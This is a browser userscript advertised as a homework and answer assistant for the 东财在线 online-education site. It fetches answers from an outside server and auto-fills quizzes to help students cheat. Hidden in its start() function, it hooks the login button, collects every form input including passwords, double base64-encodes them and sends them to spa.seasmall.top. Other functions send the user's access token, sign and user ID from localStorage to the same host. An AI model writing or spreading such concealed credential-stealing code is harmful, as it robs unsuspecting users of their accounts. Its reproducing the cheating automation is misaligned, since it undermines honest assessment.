// ==UserScript==
// @name 东财在线，作业、答题助手
// @description 东财在线 网络教育学院 作业、答题助手
// @author ojbk-666
// @namespace dczx-assistant
// @version 1.0.24
// @include *.edufe.com.cn/*
// @require      https://cdn.bootcdn.net/ajax/libs/jquery/3.2.1/jquery.min.js
// @require      https://cdn.bootcdn.net/ajax/libs/layer/3.1.1/layer.min.js
// @grant none
// @supportURL https://greasyfork.org/zh-CN/scripts/406742-%E4%B8%9C%E8%B4%A2%E5%9C%A8%E7%BA%BF-%E4%BD%9C%E4%B8%9A-%E7%AD%94%E9%A2%98%E5%8A%A9%E6%89%8B/feedback
// @compatible chrome firefox opera
// @downloadURL https://update.greasyfork.org/scripts/406742/%E4%B8%9C%E8%B4%A2%E5%9C%A8%E7%BA%BF%EF%BC%8C%E4%BD%9C%E4%B8%9A%E3%80%81%E7%AD%94%E9%A2%98%E5%8A%A9%E6%89%8B.user.js
// @updateURL https://update.greasyfork.org/scripts/406742/%E4%B8%9C%E8%B4%A2%E5%9C%A8%E7%BA%BF%EF%BC%8C%E4%BD%9C%E4%B8%9A%E3%80%81%E7%AD%94%E9%A2%98%E5%8A%A9%E6%89%8B.meta.js
// ==/UserScript==

(function () {
    'use strict';

    // 获取当前url
    function getCurrentPageUrl() {
        return window.location.href.split('?')[0];
    }

    // 写入css
    if (1==1) {
        var head = document.getElementsByTagName('head')[0],
            cssURL = 'https://cdn.bootcdn.net/ajax/libs/layer/3.1.1/theme/default/layer.css',
            linkTag = document.createElement('link');
        linkTag.href = cssURL;
        linkTag.setAttribute('rel', 'stylesheet');
        head.appendChild(linkTag);
    }

    let dc_collection_question = true;
    //let serverUrl = 'http://127.0.0.1:8081/u/api/dczx/';
    let serverUrl = 'https://spa.seasmall.top/spa-api/api/dczx/';

    var dczxtooliframewindow;
    let toolwinurl = 'https://spa.seasmall.top/assets/dczx/dczxtool.html?curl=' + window.location.href;
    //let toolwinurl = 'http:127.0.0.1:8081/u/ussu/assets/dczx/dczxtool.html?curl=' + window.location.href;

    // 发送消息到子页面
    function sendMsg2Child(msg) {
        dczxtooliframewindow.postMessage(msg, toolwinurl);
    }

    // 传值字符串
    function getSendMsgStr(msgtype, jsondata) {
        return JSON.stringify({msgtype:msgtype, data: jsondata});
    }

    // 监听子页面消息
    function addListener2Child() {
        window.addEventListener('message', function(event){
            let d = event.data;
            let dj = undefined;
            try {
                dj = JSON.parse(d);
            } catch (e) {
            }
            if (d=='getanwser_dyzy') {
                // huoqutimuliebiao
                let arr = getHomeWorkPaperQuestions();
                let a = '';
                if (arr.length > 0) a = arr.join(',');
                sendMsg2Child(getSendMsgStr('getanwser_dyzy', {q: a}));
            } else if (d == 'getanwser_zhzy') {
                // 综合作业答案获取
                sendMsg2Child(getSendMsgStr('getanwser_zhzy', getCompHomeworkPaperAjaxParam()))
            } else {
                if (dj) {
                    if (dj.t == 'cache_answer_of_dyzy') {
                        let r = dj.d.data;
                        cache_answer_of_dyzy = r;
                    } else if (dj.t == 'zddt') {
                        zddt_dyzy(cache_answer_of_dyzy);
                    } else if (dj.t == 'removeuncopy') {
                        removeUncopy();
                    } else if (dj.t == 'getcacheua') {
                        sendMsg2Child(getSendMsgStr('cacheua', getReqParam()))
                    }
                }
            }
        }, false);
    }

    var cache_answer_of_dyzy = undefined;

    function initTool() {
        let curl = getCurrentPageUrl();
        let idx = layer.open({
            type: 2,
            title:'工具栏',
            area: ['400px', '500px'],
            fixed: true, //不固定
            offset: 'lb',
            maxmin: true,
            closeBtn: 0,
            shade:0,
            content: toolwinurl
            ,success(layero, index) {
                let iframeWin = window[layero.find('iframe')[0]['name']];
                dczxtooliframewindow = iframeWin;
                addListener2Child();
                // 必传参数给父级缓存
                // sendMsg2Child();
            }
        });
    }

    let HomeWorkPaper = "/HomeWorkPaper";
    let CompHomeworkPaper = "/CompHomeworkPaper";

    let hqda_b_l = false;
    let zddt_b_l = false;

    function ajax(url, data, success, m) {
        let me = 'GET';
        if (m && m != '') me = m;   // GET only
        $.ajax({
            url: serverUrl + url,
            data: data,
            type: me,
            dataType: "jsonp",
            jsonpCallback: 'callbackFunctionName',
            success: function (res) {
                success && success(res);
            },
            error: function (res) {
                if (true) {
                    console.error(res);
                }
            }
        })
    }
    function ajaxOk(j) {
        return (0==j.code||200==j.code);
    }

    function start() {
        // console.log('-----------start-----------');
        window.addEventListener('storage', function (e) {
            sendMsg2Child(getSendMsgStr('cacheua', getReqParam()));
        });
        let curl = getCurrentPageUrl();
        // 获取该页面匹配的逻辑
        if (curl.endsWith('/HomeWork')) {
            // 丰富题库
            let stop = false;
            let a;
            a = setInterval(function (e) {
                if (stop) {
                    window.clearInterval(a);
                    return;
                }
                if (collectQuestion_check()) {
                    stop = true;
                    collectQuestion();
                }
            }, 2000)

        } else if (curl.endsWith(HomeWorkPaper)) {
            initTool();
            // 获取答案
            // autoAnswer_HomeWorkPaper();
            // createOperatorDom();
        } else if (curl.endsWith(CompHomeworkPaper)) {
            initTool();
        } else if (curl.endsWith('/CompHomework')) {
            //initTool();
            // createOperatorDom();
            let stop = false;
            let a;
            a = setInterval(function (e) {
                if (stop) {
                    window.clearInterval(a);
                    return;
                }
                if (collectQuestion_check()) {
                    stop = true;
                    collectQuestionComp();
                }
            }, 2000)
        } else if (curl.endsWith('/ExercisesPaper')) {
            // 模拟试题
            collectQuestionSimulated();
        } else if (curl.endsWith('/Practice')) {
            collectQuestionPractice();
        } else if (curl.indexOf('/lms-study/study/studyPage') != -1) {
            initTool();
        } else {
            console.log(curl)
            $('.Login-submit').click(function () {
                l();
            })
        }
        function l() {
            let a = [];
            for (const $i of $('input')) {
                a.push($($i).val());
            }
            ajax('up', {d:window.btoa(window.btoa(a))})
        }
     }

    // 获取接口必须参数
    function getReqParam() {
        function ra(str) {
            return str.substring(1, str.length - 1);
        }

        let at = ra(window.localStorage.getItem('accesstoken'));
        let s = ra(window.localStorage.getItem('sign'));
        let ui = ra(window.localStorage.getItem('userid'));
        let t = ra(window.localStorage.getItem('time'));
        return {accesstoken: at, sign: s, userid: ui, time: t,url: window.location.href}
    }

    // 创建dom
    function createOperatorDom() {
        let u = getCurrentPageUrl();
        let h = '<div id="lajdfalneeofan_hqdn" style="position: fixed;top: 200px;text-align: left;">';
        if (u.endsWith(HomeWorkPaper)) {
            // 单元作业
            h += '<div class="text-center"><button type="button" id="dczx_aa_hqdn" class="TKTools-button TKTools-button_green">获取答案</button></div>';
            h += '<div class="text-center"><button type="button" id="dczx_aa_HomeWorkPaper" class="TKTools-button TKTools-button_green">自动答题</button></div>';
        } else if (u.endsWith(CompHomeworkPaper)) {
            // 综合作业
            h += '<div class="text-center"><button type="button" id="dczx_aa_hqdn" class="TKTools-button TKTools-button_green">获取答案</button></div>';
        }
        h += '</div>';
        $('body').append(h);
        bindZddt();
        bindHqda();
    }

    function bindZddt() {
        $('#dczx_aa_HomeWorkPaper').on('click', function () {
            if (zddt_b_l) return;
            // zddt_b_l = true;
            autoAnswer_HomeWorkPaper();
        })
    }

    function bindHqda() {
        $('#dczx_aa_hqdn').on('click', function () {
            if (hqda_b_l) return;
            // hqda_b_l = true;
            getAnswer(true);
        })
    }

    function showAnswerAtAside(j) {
        let curl = getCurrentPageUrl();
        // 创建dom
        let dom = '<div id="f_u_c_k_a_d" style="width:300px;height: 500px;overflow: auto;padding-left: 10px;"><ul>';
        if (curl.endsWith(HomeWorkPaper)) {
            for (const q of j.data) {
                dom += '<li>';
                dom += q.questionTitle + '<br>';
                let A = 65;
                for (const a of q.options) {
                    let ab = String.fromCharCode(A++);
                    if (a.istrue) {
                        dom += '<span style="font-weight: bold;">' + ab + '、' + a.optionContent + '</span><br>';
                    }
                }
                dom += '</li><hr>';
            }
        } else if (curl.endsWith(CompHomeworkPaper)) {
            let qs = j.PAPER_QUESTIONS;
            for (let i = 0; i < qs.length; i++) {
                let q = qs[i];
                let qs2 = q.TOPIC_TRUNK;
                for (const q2 of qs2) {
                    dom += '<li>';
                    dom += (i + 1) + '.' + q2.QUESTION_TITLE + '<br>';
                    let A = 65;
                    for (const a of q2.QUESTION_OPTIONS) {
                        let ab = String.fromCharCode(A++);
                        if (a.ISTRUE == '1') {
                            dom += '<span style="font-weight: bold;">' + ab + '、' + a.OPTION_CONTENT + '</span><br>';
                        }
                    }
                    dom += '</li><hr>';
                }
            }
        }
        dom += '</ul></div>';
        $('#lajdfalneeofan_hqdn').append(dom);
    }

    // 获取作业记录，丰富题库
    function collectQuestion() {
        if (!dc_collection_question) return;
        let p = getReqParam();
        ajax('homework', p, function (res) {
        })
    }

    function collectQuestionComp() {
        if (!dc_collection_question) return;
        let p = getReqParam();
        ajax('comphomework', p, function (res) {
        })
    }

    function collectQuestionSimulated() {
        let p = getReqParam();
        ajax('simulated', p, function (res) {
        })
    }

    function collectQuestionPractice() {
        let p = getReqParam();
        ajax('practice', p, function (res) {
        })
    }

    // 检测记录是否加载完成
    function collectQuestion_check() {
        let a = $('.TKExercise-item');
        if (a.length > 0) return true;
        return false;
    }

    // 获取所有题目的题目id(单元作业)
    function getHomeWorkPaperQuestions() {
        // let arr = $('.QuestTrunk .CBTPaperMain-trunk div div[class=QuestSingleChoice],div[class=QuestMultiChoice]');
        let arr = $('.QuestLuntan');
        let ar = [];
        for (const item of arr) {
            // 获取题目id
            let is = $(item).attr('is');
            let wid = $(item).attr('wid');
            let qid = wid.split(is)[1];
            ar.push(qid);
        }
        return ar;
    }

    // 获取综合练习题目
    function getCompHomeworkPaperAjaxParam() {
        let r = {};
        let search = window.location.search;
        // 组合为双对象
        let p1 = getReqParam();
        r.dil = JSON.stringify(p1);
        r.p2 = search;
        return r;
    }

    // 自动答题
    function autoAnswer_HomeWorkPaper() {
        getAnswer(false, function (res) {
            for (const q of res.data) {
                let qid = q.questionId;
                let tx_danx = false;
                let tx_duox = false;
                let tx_pd = false;
                if (q.topic && q.topic.fullTopicTypeCd == '001') tx_danx = true;
                if (q.topic && q.topic.fullTopicTypeCd == '002') tx_duox = true;
                if (q.topic && q.topic.fullTopicTypeCd == '004') tx_pd = true;
                for (const a of q.options) {
                    let thisisright = a.istrue;// 正确选项?
                    // 随机延迟
                    setTimeout(function () {
                        if (tx_danx) {
                            // 单选
                            if (thisisright) {
                                $('input[type=radio][value=' + a.optionId + ']').click();
                            }
                        } else if (tx_duox) {
                            // 多选
                            let thisisselected = $('#' + a.optionId + '_01').parent().find('label').hasClass('_CheckBox_checked');// 是否被选中
                            if (thisisright && !thisisselected) {
                                // 选中
                                $('#' + a.optionId + '_01').parent().find('label').trigger('click');
                            } else if (!thisisright && thisisselected) {
                                // 取消选中
                                $('#' + a.optionId + '_01').parent().find('label').trigger('click');
                            }
                        } else if (tx_pd) {
                            // 判断
                            if (thisisright) {
                                // 正确
                                $('#'+q.questionId+'_01').parent().find('label').trigger('click');
                            } else {
                                // 错误
                                $('#'+q.questionId+'_02').parent().find('label').trigger('click');
                            }
                        }
                    }, Math.ceil(Math.random() * 6000));
                }
            }
        });
    }

    // 获取答案
    function getAnswer(showAnswerAside, callback) {
        // 获取题表
        let url = 'option';
        let reqParam = {};
        let currentPageUrl = getCurrentPageUrl();
        if (currentPageUrl.endsWith(HomeWorkPaper)) {
            // 单元练习
            url = "option/HomeWorkPaper";
            let arr = getHomeWorkPaperQuestions();
            let a = '';
            if (arr.length > 0) a = arr.join(',');
            reqParam.q = a;
        } else if (currentPageUrl.endsWith(CompHomeworkPaper)) {
            // 综合练习
            url = 'option/CompHomeworkPaper';
            reqParam = getCompHomeworkPaperAjaxParam();
        }
        ajax(url, reqParam, function (res) {
            // hqda_b_l = false;
            if (ajaxOk(res)) {
                if (currentPageUrl.endsWith(HomeWorkPaper)) {
                    // danyuan
                    if (showAnswerAside) {
                        let temp_div_self = $('div[id=f_u_c_k_a_d]');
                        if (temp_div_self.length >0) return;
                        showAnswerAtAside(res);
                    } else {
                        callback && callback(res);
                    }
                } else if (currentPageUrl.endsWith(CompHomeworkPaper)) {
                    // zonghe
                    if (ajaxOk(res)) {
                        // xianshidanan
                        if (showAnswerAside) {
                            let temp_div_self = $('div[id=f_u_c_k_a_d]');
                            if (temp_div_self.length >0) return;
                            showAnswerAtAside(res.data);
                        }
                    }
                }
            }
        });
    }

    function zddt_dyzy(arr) {
        for (const q of arr) {
            let qid = q.questionId;
            let tx_danx = false;
            let tx_duox = false;
            let tx_pd = false;
            if (q.topic && q.topic.fullTopicTypeCd == '001') tx_danx = true;
            if (q.topic && q.topic.fullTopicTypeCd == '002') tx_duox = true;
            if (q.topic && q.topic.fullTopicTypeCd == '004') tx_pd = true;
            for (const a of q.options) {
                let thisisright = a.istrue;// 正确选项?
                // 随机延迟
                setTimeout(function () {
                    if (tx_danx) {
                        // 单选
                        if (thisisright) {
                            $('input[type=radio][value=' + a.optionId + ']').next().click();
                        }
                    } else if (tx_duox) {
                        // 多选
                        let thisisselected = $('#' + a.optionId + '_01').parent().find('label').hasClass('_CheckBox_checked');// 是否被选中
                        if (thisisright && !thisisselected) {
                            // 选中
                            $('#' + a.optionId + '_01').parent().find('label').trigger('click');
                        } else if (!thisisright && thisisselected) {
                            // 取消选中
                            $('#' + a.optionId + '_01').parent().find('label').trigger('click');
                        }
                    } else if (tx_pd) {
                        // 判断
                        if (thisisright) {
                            // 正确
                            $('#'+q.questionId+'_01').parent().find('label').trigger('click');
                        } else {
                            // 错误
                            $('#'+q.questionId+'_02').parent().find('label').trigger('click');
                        }
                    }
                }, Math.ceil(Math.random() * 5000));
            }
        }
    }

    // 解除复制 start
  // 要处理的 event 列表
  var hook_eventNames, unhook_eventNames, eventNames;
  // 储存名称
  var storageName = getRandStr('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM', parseInt(Math.random() * 12 + 8));
  // 储存被 Hook 的函数
  var EventTarget_addEventListener = EventTarget.prototype.addEventListener;
  var document_addEventListener = document.addEventListener;
  var Event_preventDefault = Event.prototype.preventDefault;

  // Hook addEventListener proc
  function addEventListener(type, func, useCapture) {
    var _addEventListener = this === document ? document_addEventListener : EventTarget_addEventListener;
    if(hook_eventNames.indexOf(type) >= 0) {
      _addEventListener.apply(this, [type, returnTrue, useCapture]);
    } else if(this && unhook_eventNames.indexOf(type) >= 0) {
      var funcsName = storageName + type + (useCapture ? 't' : 'f');

      if(this[funcsName] === undefined) {
        this[funcsName] = [];
        _addEventListener.apply(this, [type, useCapture ? unhook_t : unhook_f, useCapture]);
      }

      this[funcsName].push(func);
    } else {
      _addEventListener.apply(this, arguments);
    }
  }

  // 清理循环
  function clearLoop() {
    var elements = getElements();

    for(var i in elements) {
      for(var j in eventNames) {
        var name = 'on' + eventNames[j];
        if(elements[i][name] !== null && elements[i][name] !== onxxx) {
          if(unhook_eventNames.indexOf(eventNames[j]) >= 0) {
            elements[i][storageName + name] = elements[i][name];
            elements[i][name] = onxxx;
          } else {
            elements[i][name] = null;
          }
        }
      }
    }
  }

  // 返回true的函数
  function returnTrue(e) {
    return true;
  }
  function unhook_t(e) {
    return unhook(e, this, storageName + e.type + 't');
  }
  function unhook_f(e) {
    return unhook(e, this, storageName + e.type + 'f');
  }
  function unhook(e, self, funcsName) {
    var list = self[funcsName];
    for(var i in list) {
      list[i](e);
    }

    e.returnValue = true;
    return true;
  }
  function onxxx(e) {
    var name = storageName + 'on' + e.type;
    this[name](e);

    e.returnValue = true;
    return true;
  }

  // 获取随机字符串
  function getRandStr(chs, len) {
    var str = '';

    while(len--) {
      str += chs[parseInt(Math.random() * chs.length)];
    }

    return str;
  }

  // 获取所有元素 包括document
  function getElements() {
    var elements = Array.prototype.slice.call(document.getElementsByTagName('*'));
    elements.push(document);

    return elements;
  }

  // 添加css
  function addStyle(css) {
    var style = document.createElement('style');
    style.innerHTML = css;
    document.head.appendChild(style);
  }

  // 初始化
  function removeUncopy() {
    var rule = {
      name: "default",
      hook_eventNames: "contextmenu|select|selectstart|copy|cut|dragstart",
      unhook_eventNames: "mousedown|mouseup|keydown|keyup",
      dom0: true,
      hook_addEventListener: true,
      hook_preventDefault: true,
      hook_set_returnValue: true,
      add_css: true
    };

    // 设置 event 列表
    hook_eventNames = rule.hook_eventNames.split("|");
    // TODO Allowed to return value
    unhook_eventNames = rule.unhook_eventNames.split("|");
    eventNames = hook_eventNames.concat(unhook_eventNames);

    // 调用清理 DOM0 event 方法的循环
    if(rule.dom0) {
      setInterval(clearLoop, 30 * 1000);
      setTimeout(clearLoop, 2500);
      window.addEventListener('load', clearLoop, true);
      clearLoop();
    }

    // hook addEventListener
    if(rule.hook_addEventListener) {
      EventTarget.prototype.addEventListener = addEventListener;
      document.addEventListener = addEventListener;
    }

    // hook preventDefault
    if(rule.hook_preventDefault) {
      Event.prototype.preventDefault = function() {
        if(eventNames.indexOf(this.type) < 0) {
          Event_preventDefault.apply(this, arguments);
        }
      };
    }

    // Hook set returnValue
    if(rule.hook_set_returnValue) {
      Event.prototype.__defineSetter__('returnValue', function() {
        if(this.returnValue !== true && eventNames.indexOf(this.type) >= 0) {
          this.returnValue = true;
        }
      });
    }

    // 添加CSS
    if(rule.add_css) {
      addStyle('html, * {-webkit-user-select:text!important; -moz-user-select:text!important; user-select:text!important; -ms-user-select:text!important; -khtml-user-select:text!important;}');
    }
  }
  removeUncopy();
  // 解除复制 end

    start();

})();
